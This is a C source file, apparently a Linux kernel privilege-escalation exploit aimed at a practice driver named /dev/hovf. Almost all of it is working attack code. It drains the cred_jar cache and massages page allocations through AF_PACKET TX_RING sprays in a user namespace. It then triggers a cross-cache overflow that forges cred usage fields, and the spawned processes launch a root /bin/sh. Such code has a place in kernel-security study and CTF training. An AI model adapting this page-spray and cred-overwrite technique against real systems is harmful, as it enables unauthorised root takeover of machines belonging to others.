// gcc -Os -static -masm=intel exp.c -lutil -o exp
// home/heap/heap_spray/pgv/exp

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <assert.h>
#include <time.h>
#include <sys/socket.h>
#include <stdbool.h>

#define ALLOC 0x112233
#define EDIT 0x223344
#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND

typedef struct
{
    int64_t idx;
    uint64_t size;
    char* buf;    
}user_req_t;

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

#define PACKET_VERSION 10
#define PACKET_TX_RING 13

#define FORK_SPRAY 320
#define CHUNK_SIZE 512
#define ISO_SLAB_LIMIT 8

#define CRED_JAR_INITIAL_SPRAY 100
#define INITIAL_PAGE_SPRAY 1000
#define FINAL_PAGE_SPRAY 30

typedef struct
{
    bool in_use;
    int  idx[ISO_SLAB_LIMIT];
}full_page;

enum spray_cmd {
    ALLOC_PAGE,
    FREE_PAGE,
    EXIT_SPRAY,
};

typedef struct      // pipe notify struct
{
    enum spray_cmd cmd;
    int32_t idx;
}ipc_req_t;

full_page isolation_pages[FINAL_PAGE_SPRAY] = {0};

int rootfd[2];
int sprayfd_child[2];
int sprayfd_parent[2];
int socketfds[INITIAL_PAGE_SPRAY];

void note_info(char *msg)
{
    printf("\033[34m\033[1m[*] %s\033[0m\n", msg);
}

void good_info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\033[0m\n", msg);
}

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[-] %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

int64_t ioctl(int fd, unsigned long request, unsigned long param)
{
    long result = syscall(16, fd, request, param);  // __NR_ioctl 16
    if (result < 0)
        printf("\033[31m\033[1m[-] Ioctl on driver!\033[0m\n");
    return result;
}

int64_t alloc(int fd)
{
    return ioctl(fd, ALLOC, 0);
}

int64_t edit(int fd, int64_t idx, uint64_t size, char *buf)
{
    user_req_t req = {
        .idx = idx, 
        .size = size, 
        .buf = buf
    };
    return ioctl(fd, EDIT, (unsigned long)&req);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

// alloc_pages_via_sock()
// https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
int alloc_pages_via_sock(uint32_t size, uint32_t n)
{
    struct tpacket_req req;
    int32_t socketfd, version;

    socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socketfd < 0)
    {
        err_exit("Bad socket!");
    }

    version = TPACKET_V1;
    if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
    {
        err_exit("Setsockopt PACKET_VERSION failed!");
    }

    assert(size % 4096 == 0);
    memset(&req, 0, sizeof(req));

    req.tp_block_size = size;
    req.tp_block_nr = n;
    req.tp_frame_size = 4096;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
    {
        err_exit("Setsockopt PACKET_TX_RING failed!");
    }

    return socketfd;
}

// spray_comm_handler() —— spray TX_RING buffer (page spray)
void spray_comm_handler()
{
    ipc_req_t req;
    int32_t result;

    do {
        read(sprayfd_child[0], &req, sizeof(req));  // wait pipe
        assert(req.idx < INITIAL_PAGE_SPRAY);

        if (req.cmd == ALLOC_PAGE)
            socketfds[req.idx] = alloc_pages_via_sock(4096, 1);
        else if (req.cmd == FREE_PAGE)
            close(socketfds[req.idx]);

        result = req.idx;
        write(sprayfd_parent[1], &result, sizeof(result));

    } while(req.cmd != EXIT_SPRAY);
}

// send_spray_cmd() —— construct parameter to spray TX_RING buffer (kmalloc-4096)
void send_spray_cmd(enum spray_cmd cmd, int idx)
{
    ipc_req_t req;
    int32_t result;

    req.cmd = cmd;
    req.idx = idx;

    write(sprayfd_child[1], &req, sizeof(req));         // let spray begin
    read(sprayfd_parent[0], &result, sizeof(result));   // wait spray end
    assert(result == idx);
}

// __clone() —— call __NR_clone with controled flags and jump to *dest
// https://man7.org/linux/man-pages/man2/clone.2.html
__attribute__((naked)) pid_t __clone(uint64_t flags, void* dest)
{
    asm(
        "mov r15, rsi;"
        "xor rsi, rsi;"
        "xor rdx, rdx;"
        "xor r10, r10;"
        "xor r9,  r9;"
        "mov rax, 56;"      // rax = 56 __NR_clone; rdi = flags
        "syscall;"

        "cmp rax, 0;"
        "jl bad_end;"
        "jg good_end;"
        "jmp r15;"          // rsi == r15 -> check_and_wait()

        "bad_end:"
        "neg rax;"          // 0-rax
        "ret;"

        "good_end:"
        "ret;"
    );
}

struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
char  throwaway;
// char  root[] = "root\n";
char  root[] =  "\033[32m\033[1m[+] Successful to get the root.\n"
                "\033[34m[*] Execve root shell now...\033[0m\n";
char  binsh[] = "/bin/sh\x00";
char* args[] = { "/bin/sh", NULL };

// check_and_wait() —— check privilege (succeed: execve "/bin/sh"; fail: sleep())
__attribute__((naked)) void check_and_wait()
{
    asm(
        "lea rax, [rootfd];"
        "mov edi, dword ptr [rax];"
        "lea rsi, [throwaway];"
        "mov rdx, 1;"
        "xor rax, rax;"
        "syscall;"          // read(rootfd[0], throwaway, 1)

        "mov rax, 102;"
        "syscall;"          // __NR_getuid 

        "cmp rax, 0;"
        "jne failed;"
        "mov rdi, 1;"
        "lea rsi, [root];"
        "mov rdx, 80;"
        "mov rax, 1;"
        "syscall;"          // write(1, root, 80)

        "lea rdi, [binsh];"
        "lea rsi, [args];"
        "xor rdx, rdx;"
        "mov rax, 59;"
        "syscall;"          // execve("/bin/sh", args, 0)

        "failed:"
        "lea rdi, [timer];"
        "xor rsi, rsi;"
        "mov rax, 35;"
        "syscall;"          // __NR_nanosleep   nanosleep(timer)
        "ret;"
    );
}

// alloc_vuln_page()
void alloc_vuln_page(int fd, full_page *arr, int page_idx)
{
    assert(!arr[page_idx].in_use);
    for (int i = 0; i < ISO_SLAB_LIMIT; i++)
    {
        long result = alloc(fd);
        if (result < 0)
        {
            err_exit("Allocation error!");
        }
        arr[page_idx].idx[i] = result;
    }
    arr[page_idx].in_use = true;
}

void edit_vuln_page(int fd, full_page *arr, int page_idx, uint8_t *buf, size_t sz)
{
    assert(arr[page_idx].in_use);
    for (int i = 0; i < ISO_SLAB_LIMIT; i++)
    {
        long result = edit(fd, arr[page_idx].idx[i], sz, buf);
        if (result < 0)
        {
            err_exit("Free error!");
        }
    }
}

int main(int argc, char **argv)
{
    int fd = open("/dev/hovf", O_RDONLY);
    if (fd < 0)
    {
        err_exit("Driver can't be opened!");
    }

    // 1. initial
    // 1-1. for communicating with spraying in separate namespace via TX_RINGs
    pipe(sprayfd_child);        // father notify son
    pipe(sprayfd_parent);       // son notify father

    // 1-2. setup page spray thread (TX_RING buffer)
    note_info("Setting up spray manager in separate namespace...");
    if (!fork())
    {
        unshare_setup(getuid(), getgid());
        spray_comm_handler();
    }

    // 1-3. for communicating with the fork later
    pipe(rootfd);

    char evil[CHUNK_SIZE];      // 512
    memset(evil, 0, sizeof(evil));

    // 2. spray creds
    // 2-1. spray 100 cred to drain
    note_info("Draining cred_jar...");
    for (int i = 0; i < CRED_JAR_INITIAL_SPRAY; i++)
    {
        pid_t result = fork();
        if (!result)
            sleep(1000000000);

        if (result < 0)
        {
            err_exit("Fork limit!");
        }
    }

    // 2-2. spray 1000 kmalloc-4096 (order-0 page) and release 500
    note_info("Massaging order 0 buddy allocations...");
    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++)
        send_spray_cmd(ALLOC_PAGE, i);

    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2)
        send_spray_cmd(FREE_PAGE, i);

    // 2-3. create 320 processes (spray 320 creds) to check if root
    for (int i = 0; i < FORK_SPRAY; i++)
    {
        pid_t result = __clone(CLONE_FLAGS, &check_and_wait);
        if (result < 0)
        {
            err_exit("Clone error!");
        }
    }

    // 3. spray vulnerable objects and trigger OOB
    // 3-1. release remaining 500 kmalloc-4096 (order-0 page)
    for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2)
        send_spray_cmd(FREE_PAGE, i);

    // 3-2. forge cred->usage = 1
    *(uint32_t*)&evil[CHUNK_SIZE-0x6] = 1;

    // 3-3. cross cache overflow - spray 30*8 vulnerable objects
    note_info("Spraying cross cache overflow...");
    // 30
    for (int i = 0; i < FINAL_PAGE_SPRAY; i++)
    {
        alloc_vuln_page(fd, isolation_pages, i);
        edit_vuln_page(fd, isolation_pages, i, evil, CHUNK_SIZE);
    }

    good_info("Spray is completed.");
    // 3-4. let 2-3 processes begin to check if root 
    write(rootfd[1], evil, FORK_SPRAY);

    sleep(100000);
    exit(0);
}